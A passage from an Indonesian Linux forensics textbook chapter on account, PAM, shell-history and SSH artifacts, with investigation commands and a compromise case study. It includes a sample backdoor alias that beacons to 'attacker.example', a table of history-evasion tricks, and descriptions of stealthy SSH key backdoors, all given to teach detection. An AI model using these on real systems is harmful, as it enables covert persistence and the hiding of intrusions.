Disebut sekilas — beberapa file konfigurasi pendukung PAM yang relevan untuk konteks investigasi lanjutan (bukan fokus mendalam bab ini):

| File | Fungsi Singkat |
|---|---|
| `faillock.conf` | Konfigurasi detail modul `pam_faillock` (§4.7.2) |
| `limits.conf` | Batasan resource per user/grup (jumlah proses, ukuran file, dll) |
| `access.conf` | Kontrol akses login berdasarkan user/grup/asal koneksi |

---

#### 4.7.4 Pengantar PAM Backdoor

PAM, karena posisinya sebagai gerbang autentikasi paling sentral, adalah target favorit untuk **backdoor tingkat lanjut** — modul jahat yang disisipkan ke dalam stack (misalnya modul custom yang menerima "password master" rahasia selain password asli user). Ini **tidak dibahas detail teknis di bab ini** — pembahasan penuh soal deteksi & analisis PAM backdoor ada di **Bab 8**. Di sini cukup dipahami bahwa `/etc/pam.d/` bukan cuma soal policy lockout, tapi juga permukaan serangan persistence yang serius.

---

### 4.8 Account Lifecycle Forensics (Create/Modify/Delete) 🔴

**Pengertian & Fungsi:**
Bab ini fokus ke **artefak filesystem** dari siklus hidup akun (dibedakan tegas dari log siklus akun yang sudah dibahas Bab 3) — jejak yang tertinggal di disk akibat akun dibuat, diubah, atau dihapus.

**Artefak kunci:**

| Artefak | Nilai Forensik |
|---|---|
| Home directory baru ter-copy dari `/etc/skel` | Konfirmasi akun benar dibuat lewat `useradd` normal (bukan manual `mkdir` + edit `passwd` langsung), cross-ref §4.4 |
| **mtime** `/etc/passwd`, `/etc/shadow`, `/etc/group` | Anchor waktu perubahan **terakhir** ke masing-masing file — meski tidak sedetail log per-baris, tetap berguna kalau log tidak tersedia. Konsep timestamp filesystem sudah dibahas Bab 2 §2.1.2 |
| **Orphaned home directory** | Folder tersisa di `/home` **tanpa** entry yang cocok di `/etc/passwd` — terjadi kalau user dihapus (`userdel`) tapi home directory-nya tidak (atau sengaja dibiarkan). Ini adalah **recoverable evidence**: isi home directory user yang sudah dihapus tetap bisa dianalisis meski akunnya sudah tidak ada |
| **UID reuse** | UID lama (milik akun yang sudah dihapus) dipakai ulang untuk akun baru — berpotensi menimbulkan ambiguitas kepemilikan file lama. File-file lama yang masih menyimpan UID lama di metadata-nya sekarang **tampak** dimiliki oleh akun baru yang kebetulan dapat UID sama, padahal bukan pemilik aslinya |

```bash
# Cek mtime file-file kunci akun
stat /etc/passwd /etc/shadow /etc/group

# Cari file yang UID pemiliknya tidak match entry manapun di /etc/passwd
# (baik karena user sudah dihapus, maupun UID reuse)
find / -xdev -nouser 2>/dev/null
```

> 💡 `ls -n` menampilkan UID numerik langsung (bukan nama) — berguna persis untuk kasus UID reuse/user terhapus, karena `ls -l` biasa akan menampilkan nama user yang **sekarang** memegang UID itu (bisa menyesatkan kalau UID itu sudah dipakai ulang).

---

### 4.9 `/etc/securetty` & `/etc/nsswitch.conf` 🟡

**`/etc/securetty`** — mendaftar TTY (terminal) mana saja yang boleh dipakai untuk login **root langsung** (bukan lewat `sudo`/`su`). Relevan kalau investigator mencurigai ada login root langsung dari console/TTY yang tidak wajar — bandingkan TTY asal login root (dari log/wtmp, Bab 3 & §4.14) dengan daftar yang diizinkan di file ini.

**`/etc/nsswitch.conf`** — menentukan sumber resolusi informasi user/group: `files` (lokal, yaitu `/etc/passwd` dkk), `sss` (SSSD, biasanya untuk join domain), `ldap`, dll. Penting dicek di server yang **domain-joined**, karena menentukan apakah `/etc/passwd` lokal itu **satu-satunya** sumber data user di sistem, atau ada backend eksternal (LDAP/Active Directory) yang juga berperan — kalau backend eksternal terlibat, investigasi user/auth **tidak cukup** hanya melihat file lokal di bab ini. Topik LDAP/AD **tidak dibahas** detail di Bab 4 — akan disinggung kembali di konteks Bab 11 (Network/Enterprise).

```bash
cat /etc/nsswitch.conf | grep -E "^passwd|^group|^shadow"
```

---

### 4.10 Shell History Forensics

#### 4.10.1 `.bash_history`/`.zsh_history`

**Pengertian & Fungsi:**
File history shell adalah salah satu artefak paling kaya untuk merekonstruksi **command apa yang benar-benar diketik** user — lokasi default di root home directory masing-masing user (`~/.bash_history`, `~/.zsh_history`).

| Variabel Env | Fungsi |
|---|---|
| `HISTFILE` | Lokasi file history (bisa diubah/di-unset, §4.10.2) |
| `HISTSIZE` | Jumlah baris history disimpan **di memori** sesi aktif |
| `HISTFILESIZE` | Jumlah baris maksimum yang **ditulis ke file** |
| `HISTCONTROL` | Kontrol filtering apa yang dicatat (mis. `ignoredups`, `ignorespace` — lihat §4.10.2) |

```bash
cat ~/.bash_history
echo $HISTFILE $HISTSIZE $HISTFILESIZE $HISTCONTROL
```

> ⚠️ **Keterbatasan penting:** Isi `.bash_history` **hanya ditulis ke disk saat sesi shell exit dengan normal** (atau lewat perintah eksplisit `history -a`). Command dari sesi yang masih berjalan/live belum tentu ada di file ini — cross-ref §4.10.3 & §4.10.4 untuk kompensasi keterbatasan ini.

---

#### 4.10.2 Evasion Attacker

**Pengertian & Fungsi:**
Karena `.bash_history` adalah artefak yang sangat dikenal, attacker punya beberapa teknik umum untuk menghindarinya — penting dikenali karena masing-masing meninggalkan jejak berbeda (atau justru **tidak** meninggalkan jejak, sehingga investigator perlu tahu untuk mencari di tempat lain).

| Teknik | Efek |
|---|---|
| `unset HISTFILE` | History tidak ditulis ke file sama sekali untuk sisa sesi tersebut |
| `export HISTCONTROL=ignorespace` diikuti command diawali spasi | Command yang diawali dengan satu spasi **tidak** dicatat ke history — trik lama tapi masih efektif kalau `HISTCONTROL` default sistem tidak mengaktifkannya |
| Symlink `~/.bash_history` → `/dev/null` | Semua yang "ditulis" ke history sebenarnya dibuang ke `/dev/null`, history selalu kosong |
| `history -c` | Menghapus history yang tersimpan di memori sesi berjalan saat ini |

```bash
# Cek apakah .bash_history adalah symlink mencurigakan
ls -la ~/.bash_history
```

---

#### 4.10.3 Multi-session Overwrite Behavior

**Pengertian & Fungsi:**
Kalau ada beberapa sesi shell paralel berjalan bersamaan (misal dua terminal SSH aktif), command dari satu sesi bisa **saling menimpa** command dari sesi lain saat masing-masing exit — tergantung apakah opsi `shopt -s histappend` aktif.

- **Tanpa `histappend`:** shell yang exit belakangan akan **menimpa** (overwrite) seluruh isi file history dengan history sesi-nya sendiri, berpotensi menghapus command dari sesi lain yang sudah lebih dulu exit.
- **Dengan `histappend`:** command dari tiap sesi di-**append** (ditambahkan di akhir file), bukan menimpa.

> 💡 Implikasi forensik: kalau `.bash_history` yang ditemukan terasa "terlalu pendek" dibanding aktivitas yang diduga terjadi (berdasarkan log lain), salah satu kemungkinan penjelasan (selain evasion §4.10.2) adalah overwrite akibat sesi paralel tanpa `histappend` — bukan berarti data itu sengaja dihapus attacker.

---

#### 4.10.4 Sumber Pengganti kalau History Dihapus/Kosong

Kalau `.bash_history` kosong, hilang, atau dicurigai sudah dimanipulasi, dua sumber independen di Bab 3 bisa dipakai sebagai pengganti (dengan catatan cakupan berbeda — tidak selalu 1:1 identik dengan history shell):

- **Bab 3 §3.5.2** — event `EXECVE` dari `auditd`, kalau audit rule yang relevan aktif di sistem tersebut, mencatat command yang dieksekusi di level kernel (independen dari shell, sehingga tidak bisa dihindari lewat trik §4.10.2).
- **Bab 3 §3.4.6** — field `_CMDLINE` di `journald`, tersedia untuk proses yang logging-nya lewat systemd journal.

---

#### 4.10.5 Timestamp History

**Pengertian & Fungsi:**
Secara default, `.bash_history` **tidak** menyimpan timestamp per baris command — hanya urutan command tanpa waktu. Variabel `HISTTIMEFORMAT` (bash) bisa diaktifkan untuk menambahkan timestamp, tapi **sering tidak aktif** di konfigurasi default kebanyakan sistem — jadi jangan berasumsi timestamp selalu tersedia.

`.zsh_history` (Zsh) berbeda — **biasanya** punya timestamp built-in secara default, dengan format:

```
: <epoch>:<duration>;<command>
```

> 📌 Karena perbedaan ini, kalau sistem yang diperiksa memakai Zsh (bukan Bash), investigator berpeluang lebih besar dapat linimasa command langsung dari file history-nya sendiri — sementara Bash memerlukan `HISTTIMEFORMAT` yang belum tentu aktif.

---

### 4.11 Other Shell/Application History Artifacts 🔴

**Pengertian & Fungsi:**
Selain `.bash_history`, banyak aplikasi command-line lain menyimpan history-nya sendiri di home directory user — sering terlewat karena investigasi cenderung fokus ke `.bash_history` saja, padahal file-file ini kadang **sama pentingnya**, terutama kalau attacker cuma membersihkan `.bash_history` saja dan lupa yang lain.

| File | Isi | Nilai Forensik |
|---|---|---|
| `.viminfo` | Command/search history Vim, daftar path file yang pernah dibuka | Bisa mengungkap file mana saja yang pernah diedit user lewat Vim, termasuk file di luar home directory |
| `.lesshst` | Search history tool `less` | Term yang pernah dicari di dalam file lewat `less` — bisa memberi petunjuk apa yang sedang dicari user |
| `.python_history` | REPL Python | Command Python interaktif — potensial mengandung script eksploitasi/testing yang dijalankan langsung dari REPL |
| `.mysql_history` / `.psql_history` | Query database (MySQL/PostgreSQL) | **Sering bocorin credential/query sensitif** — termasuk query yang menyertakan password di dalam string koneksi, atau query eksfiltrasi data langsung |
| `.wget-hsts` | Cache HSTS dari `wget` | Daftar domain yang pernah diakses `wget` dengan HSTS — jejak domain tujuan download |
| `.rediscli_history` | Command Redis CLI | Command administrasi/query Redis |
| `.node_repl_history` | REPL Node.js | Command JavaScript interaktif |

```bash
# Cek keberadaan file-file history "kurang populer" ini di home tiap user
ls -la ~/.viminfo ~/.lesshst ~/.python_history ~/.mysql_history ~/.psql_history ~/.wget-hsts ~/.rediscli_history ~/.node_repl_history 2>/dev/null
```

---

### 4.12 Shell Startup & Config Files

**Pengertian & Fungsi:**
File konfigurasi startup shell (`.bashrc`, `.bash_profile`, `.profile`, `.zshrc`, `.bash_logout`) dieksekusi otomatis setiap kali shell dibuka/login — menjadikannya lokasi favorit untuk **persistence ringan**: command tersisip di sini akan otomatis jalan tiap kali user login atau buka terminal baru, tanpa perlu service/cron terpisah.

**Pola berbahaya yang perlu dicek:**
- Command asing yang disisipkan langsung di file (mis. baris yang men-download & jalankan sesuatu diam-diam saat shell start).
- **Alias/function override berbahaya** — contoh klasik: `alias ls='ls; curl http://attacker.example/beacon'`. Command yang kelihatan normal (`ls`) sebenarnya diam-diam memicu request tambahan ke server attacker setiap kali dipanggil, karena alias menimpa perilaku command aslinya.

```bash
cat ~/.bashrc ~/.bash_profile ~/.profile 2>/dev/null | grep -viE "^#|^$"
```

> 🔗 Ini baru pengenalan — pembahasan penuh soal persistence lewat mekanisme ini (beserta teknik-teknik terkait lainnya) ada di **Bab 6 (Persistence)**.

---

### 4.13 SSH Artifacts

#### 4.13.1 `~/.ssh/authorized_keys`

**Pengertian & Fungsi:**
Berisi daftar public key yang diizinkan login ke akun tersebut lewat SSH key-based auth — satu baris per key. Deteksi key "asing" yang ditambahkan attacker adalah salah satu pemeriksaan paling umum dalam investigasi kompromi server.

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... user@laptop
```

```bash
cat ~/.ssh/authorized_keys
```

> 🔗 Fingerprint key yang dipakai untuk login sukses biasanya juga tercatat di log SSH — cross-ref Bab 3 §3.3.1 untuk mengonfirmasi key mana yang benar dipakai untuk login, bukan cuma yang terdaftar (terdaftar ≠ pernah dipakai).

---

#### 4.13.2 `authorized_keys` Options 🔴

**Pengertian & Fungsi:**
Setiap baris di `authorized_keys` bisa diberi **opsi** sebelum bagian key itu sendiri, yang membatasi (atau kadang justru memperluas) apa yang boleh dilakukan lewat key tersebut.

```
command="/usr/bin/backup.sh",no-port-forwarding,no-agent-forwarding ssh-ed25519 AAAA... 
```

| Opsi | Fungsi |
|---|---|
| `command="..."` | Key ini **hanya** bisa dipakai menjalankan satu command spesifik yang ditentukan, apapun command yang diminta client saat SSH — sisanya diabaikan/diganti otomatis |
| `restrict` | Menonaktifkan semua fitur tambahan (port forwarding, X11, agent forwarding, pty) sekaligus, kecuali diaktifkan lagi eksplisit |
| `no-port-forwarding` | Menonaktifkan port forwarding untuk key ini |
| `no-agent-forwarding` | Menonaktifkan agent forwarding untuk key ini |
| `from="..."` | Membatasi key ini hanya bisa dipakai login dari IP/hostname tertentu |

> ⚠️ **Kenapa ini penting secara forensik:** Opsi `command=` justru sering dipakai **attacker** untuk memasang backdoor SSH yang stealthy — key baru ditambahkan dengan `command=` yang mengarah ke satu payload/reverse-shell spesifik. Dari sisi permukaan, baris ini terlihat "dibatasi" (seolah lebih aman karena tidak bisa dipakai shell bebas), padahal justru itulah yang membuatnya terlihat kurang mencurigakan dibanding key polos tanpa restriksi apapun — investigator harus tetap curiga dan mengecek **isi command yang dirujuk**, bukan menganggap adanya restriksi berarti aman.

---

#### 4.13.3 `~/.ssh/config` 🔴

**Pengertian & Fungsi:**
File konfigurasi **client-side** SSH — menentukan bagaimana perilaku `ssh` saat **menginisiasi** koneksi keluar dari akun ini ke host lain (beda dari `authorized_keys` yang mengatur siapa boleh masuk).

```
Host jump
    HostName 10.10.10.5
    User admin
    IdentityFile ~/.ssh/id_jump
    ProxyJump bastion.example.com
```

| Directive | Fungsi |
|---|---|
| `Host` | Alias nama koneksi |
| `HostName` | IP/hostname sebenarnya |
| `User` | Username default untuk koneksi ke host ini |
| `IdentityFile` | Private key spesifik yang dipakai untuk host ini |
| `ProxyJump` | Host perantara (jump host/bastion) — koneksi lewat sana dulu |

> ⚠️ **Nilai forensik:** File ini adalah **bukti niat** koneksi ke host lain — sangat relevan untuk investigasi **lateral movement/pivoting**. Kalau ditemukan entry `Host` menuju server internal lain yang bukan bagian normal workflow user tersebut (terutama dikombinasikan dengan `ProxyJump`, yang menunjukkan pola pivot berlapis), itu petunjuk kuat attacker sedang/berencana bergerak ke sistem lain dari titik pijak akun ini.

---

#### 4.13.4 `~/.ssh/known_hosts` ⚠️

**Pengertian & Fungsi:**
Menyimpan host key server-server yang pernah "ditemui" client SSH dari akun ini — sering **disalahpahami** sebagai bukti login berhasil.

> ⚠️ **Koreksi eksplisit:** `known_hosts` **hanya** mencatat host key yang pernah ditemui — bisa berasal dari **percobaan koneksi yang gagal** (misal auth ditolak setelah host key diterima), atau sekadar dari prompt konfirmasi `"yes"` pertama kali saat SSH menanyakan "apakah host ini bisa dipercaya" — **bukan bukti bahwa login ke host tersebut pernah berhasil**. Menyimpulkan "user ini pernah login ke server X" hanya dari keberadaan entry di `known_hosts` adalah kesalahan yang cukup umum.
>
> Untuk memastikan apakah koneksi **benar berhasil**, entry `known_hosts` **harus dikombinasikan** dengan bukti independen dari Bab 3 (`auth.log`/`journald` di sisi server tujuan, kalau bisa diakses) yang mengonfirmasi event login sukses.

```bash
cat ~/.ssh/known_hosts
```

---

#### 4.13.5 Private Key Ditemukan di Disk

Ditemukannya file private key (`id_rsa`, `id_ed25519`, dan variannya) di lokasi yang tidak biasa — atau bahkan di lokasi standarnya sekalipun tapi milik key yang bukan seharusnya ada di sistem tersebut — adalah indikasi kuat **credential theft** atau **staging** untuk kebutuhan pivoting/lateral movement selanjutnya. Perlu dicek apakah private key itu memang milik sah akun tersebut, atau hasil dicuri/disalin dari sistem lain.

```bash
find / -xdev \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "id_dsa" \) 2>/dev/null
```

---

#### 4.13.6 `/etc/ssh/sshd_config`

**Pengertian & Fungsi:**
Konfigurasi **server-side** daemon SSH (`sshd`) — menentukan kebijakan apa saja yang diizinkan untuk koneksi masuk ke sistem ini.

| Directive | Fungsi |
|---|---|
| `PermitRootLogin` | Apakah root boleh login langsung lewat SSH (`yes`/`no`/`prohibit-password`) |
| `PasswordAuthentication` | Apakah login pakai password (bukan cuma key) diizinkan |
| `AuthorizedKeysFile` | Path ke file `authorized_keys` yang dipakai — **defaultnya** `.ssh/authorized_keys`, tapi bisa dikustomisasi ke lokasi lain |

> ⚠️ **Nilai forensik `AuthorizedKeysFile` custom:** Kalau directive ini diarahkan ke path non-default (misal lokasi tersembunyi di luar home directory user), attacker yang sudah kompromi konfigurasi `sshd` bisa memasang backdoor key di lokasi tersebut — sementara investigator yang cuma cek `~/.ssh/authorized_keys` standar tanpa membaca `sshd_config` dulu akan **melewatkan** backdoor ini sama sekali. Selalu baca `AuthorizedKeysFile` dulu sebelum menyimpulkan "tidak ada key asing".

```bash
grep -E "^PermitRootLogin|^PasswordAuthentication|^AuthorizedKeysFile" /etc/ssh/sshd_config
```

---

#### 4.13.7 SSH Agent Forwarding & Socket

`SSH_AUTH_SOCK` adalah environment variable yang menunjuk ke socket SSH agent forwarding aktif — kalau ditemukan proses/sesi dengan variabel ini ter-set dan mengarah ke socket yang valid, itu jejak bahwa sesi tersebut punya akses **meneruskan** kredensial SSH ke host lain tanpa perlu private key disimpan lokal di sistem ini. Ini adalah jejak khas **lateral movement** — attacker yang berhasil masuk ke satu sistem dengan agent forwarding aktif berpotensi "meminjam" identitas SSH user tersebut untuk melompat ke sistem lain, tanpa pernah menyentuh private key aslinya secara langsung.

```bash
# Cek env SSH_AUTH_SOCK di proses aktif (sistem live)
env | grep SSH_AUTH_SOCK
ls -la /tmp/ssh-*/agent.*
```

---

### 4.14 User Session & Login Artifacts (Binary Files)

**Pengertian & Fungsi:**
Berbeda dari file teks yang dibahas sepanjang bab ini, sesi login juga meninggalkan jejak di beberapa file **binary** khusus — masing-masing dibaca dengan tool spesifik, bukan `cat` biasa.

| File | Isi | Tool Baca |
|---|---|---|
| `/var/log/wtmp` | Histori login **sukses**, termasuk logout & reboot | `last` |
| `/var/run/utmp` | Sesi yang **aktif saat ini** (live only) | `who`, `w` |
| `/var/log/btmp` | Histori login **gagal** | `lastb` |
| `/var/log/lastlog` | Login **terakhir** per-user (bukan histori penuh, cuma entry terakhir) | `lastlog` |

```bash
last -f /var/log/wtmp
lastb -f /var/log/btmp
lastlog
utmpdump /var/log/wtmp   # baca raw record kalau parser standar bermasalah
```

> 🔗 **Cross-ref Bab 3 (`auth.log`/journald):** File-file binary ini dan log teks Bab 3 adalah **dua sumber independen** yang mencatat kejadian login dari sisi berbeda (satu dari mekanisme accounting sesi, satu dari PAM/syslog) — kalau salah satunya sudah dimanipulasi/dihapus attacker, sumber yang lain bisa dipakai untuk saling konfirmasi silang.

---

### 4.15 Home Directory Artifacts Lain (Sekilas)

Disebut sekilas saja di bab ini, karena masing-masing punya cakupan yang jauh lebih dalam di bab lain:

- **`.cache/`, `.config/`, `.local/share/`** — menyimpan data cache & config aplikasi user, termasuk sebagian besar profil browser. Detail penuh dibahas nanti di **bab Browser Forensics**.
- **`Desktop/`, `Downloads/`** — jejak aktivitas user biasa, lebih relevan di konteks **workstation** (mesin desktop pengguna) dibanding **server** (yang biasanya tidak punya aktivitas desktop sama sekali).

---

### 4.16 Tabel Korelasi — Pertanyaan Investigasi ke Artefak

| Pertanyaan Investigasi | Artefak Utama | Cross-ref |
|---|---|---|
| Apakah ada akun backdoor dengan privilege root? | `/etc/passwd` (UID 0 ganda) | §4.2.4 |
| Apakah password akun tertentu baru saja diganti? | `/etc/shadow` field last change | §4.3.3, Bab 3 §3.3.3 |
| Apakah akun tertentu dikunci, dan sejak kapan? | `/etc/shadow` prefix `!`/`*`, `faillock --user` | §4.3.4, §4.7.2 |
| Siapa saja yang punya akses root via sudo? | `/etc/sudoers`, `/etc/sudoers.d/*`, grup `sudo`/`wheel` | §4.5.1, §4.6 |
| Apakah ada rule sudo yang rentan privilege escalation? | `/etc/sudoers` (NOPASSWD + wildcard) | §4.6.2 |
| Kapan akun user X dibuat? | mtime `/etc/passwd`, home dir dari `/etc/skel` | §4.8, Bab 3 §3.3.3 |
| Apakah ada home directory "tertinggal" dari user yang sudah dihapus? | Orphaned home directory | §4.8 |
| Command apa saja yang pernah dijalankan user? | `.bash_history`/`.zsh_history` | §4.10 |
| History shell kosong/dihapus — apa penggantinya? | auditd `EXECVE`, journald `_CMDLINE` | §4.10.4, Bab 3 §3.5.2, §3.4.6 |
| Apakah ada aplikasi CLI lain yang bocorin credential? | `.mysql_history`, `.psql_history`, dll | §4.11 |
| Apakah ada key SSH asing yang bisa dipakai login? | `~/.ssh/authorized_keys` | §4.13.1 |
| Apakah key SSH itu dibatasi command tertentu (stealthy backdoor)? | Opsi `command=` di `authorized_keys` | §4.13.2 |
| Apakah user ini pernah mencoba pivot ke host lain? | `~/.ssh/config` (ProxyJump) | §4.13.3 |
| Apakah user ini pernah berhasil login ke server lain? | `known_hosts` **+** log server tujuan (bukan `known_hosts` saja) | §4.13.4 |
| Apakah ada login root langsung dari console tak wajar? | `/etc/securetty`, `wtmp`/`lastlog` | §4.9, §4.14 |

---

### 4.17 Ringkasan Command & Tools Cheat Sheet

```bash
# --- /etc/passwd & anomali ---
awk -F: '$3==0{print}' /etc/passwd                 # UID 0 ganda
awk -F: '$3>=1000{print}' /etc/passwd               # akun reguler
awk -F: '$3<1000 && ($7~"bash|sh|zsh"){print}' /etc/passwd  # akun sistem tapi shell interaktif

# --- /etc/shadow ---
ls -l /etc/shadow                                   # cek permission (harus 600/640)
date -d "1970-01-01 + <epoch_days> days" "+%Y-%m-%d" # konversi last change

# --- login.defs ---
grep -E "^PASS_MAX_DAYS|^UID_MIN|^ENCRYPT_METHOD" /etc/login.defs

# --- group ---
getent group sudo docker adm disk

# --- sudoers ---
grep -rn "NOPASSWD" /etc/sudoers /etc/sudoers.d/
sudo -l -U <username>

# --- PAM lockout ---
faillock --user <username>

# --- account lifecycle ---
stat /etc/passwd /etc/shadow /etc/group
find / -xdev -nouser 2>/dev/null

# --- shell history ---
cat ~/.bash_history
ls -la ~/.bash_history                              # cek symlink ke /dev/null

# --- other CLI history ---
ls -la ~/.viminfo ~/.mysql_history ~/.psql_history ~/.python_history 2>/dev/null

# --- SSH ---
cat ~/.ssh/authorized_keys
cat ~/.ssh/config
cat ~/.ssh/known_hosts
find / -xdev \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null
grep -E "^PermitRootLogin|^AuthorizedKeysFile" /etc/ssh/sshd_config

# --- login/session ---
last -f /var/log/wtmp
lastb -f /var/log/btmp
lastlog
```

---

### 4.18 Mini Case Study — Workflow End-to-End

**Skenario:** Investigator mencurigai sebuah server sudah dikompromikan. Indikasi awal: performa server tidak wajar dan satu alert samar dari monitoring soal "unexpected sudo activity".

**Workflow rekonstruksi:**

1. **Cek `/etc/passwd` untuk akun backdoor (§4.2.4).** Ditemukan akun bernama `sysmgr` dengan **UID 0** — akun kedua yang punya privilege setara root, disamarkan dengan nama yang terdengar seperti akun sistem sah.

2. **Cek mtime & konteks pembuatan akun (§4.8).** `stat /etc/passwd` menunjukkan file terakhir dimodifikasi jauh lebih baru dibanding file sistem lain di sekitarnya — konsisten dengan waktu diduga terjadinya kompromi. Home directory `sysmgr` **tidak** persis mengikuti baseline `/etc/skel` normal, mengindikasikan dibuat manual, bukan lewat `useradd` standar.

3. **Cek `~/.ssh/authorized_keys` milik akun tersebut (§4.13.2).** Ditemukan satu baris key dengan opsi `command="/tmp/.hidden/beacon.sh"` — bukan key polos, tapi dibatasi untuk menjalankan satu script spesifik setiap kali dipakai login. Pola ini adalah backdoor SSH stealthy: dari luar terlihat "dibatasi" (seolah lebih aman), padahal justru itulah yang membuat key ini bisa dipakai berulang untuk memicu payload tanpa membuka shell interaktif penuh yang lebih mencolok.

4. **Cek `.bash_history` akun tersebut — ternyata kosong (§4.10.4).** Karena history kosong tidak serta-merta berarti tidak ada aktivitas, investigator beralih ke sumber pengganti: event `EXECVE` di `audit.log` (Bab 3 §3.5.2) dan field `_CMDLINE` journald (Bab 3 §3.4.6), yang berhasil merekonstruksi sebagian command yang dijalankan lewat akun `sysmgr` — termasuk command yang menyalin file ke `/tmp/.hidden/`.

5. **Cek artefak history aplikasi lain (§4.11).** Ditemukan `.mysql_history` di akun user lain (`alice`) yang berisi query dengan credential database dalam bentuk plaintext — indikasi lateral exposure tambahan, meski tidak berhubungan langsung dengan akun `sysmgr`.

6. **Cek `~/.ssh/known_hosts` untuk jejak pivot lanjutan (§4.13.4).** Ditemukan entry ke sebuah IP internal lain — tapi investigator **tidak langsung menyimpulkan** login ke sana berhasil (mengingat koreksi §4.13.4 bahwa `known_hosts` cuma bukti "pernah ditemui", bukan bukti login sukses). Konfirmasi baru bisa didapat dengan mengecek log auth di server tujuan tersebut secara terpisah.

**Kesimpulan rekonstruksi:** Kombinasi §4.2.4 (akun UID 0 ganda) + §4.8 (waktu pembuatan dari mtime) + §4.13.2 (SSH backdoor via `command=`) + §4.10.4 (kompensasi history kosong lewat auditd/journald) berhasil merekonstruksi alur kompromi tanpa bergantung pada satu artefak tunggal — dan setiap kesimpulan dijaga tetap proporsional terhadap kekuatan buktinya masing-masing (khususnya tidak overclaim dari `known_hosts` di langkah 6).

> 🔗 **Menuju Bab 5:** Setelah memahami struktur akun, autentikasi, dan jejak shell/SSH (Bab 4), bab berikutnya beralih ke domain yang berbeda lagi — melanjutkan cakupan investigasi Linux forensics sesuai urutan seri.
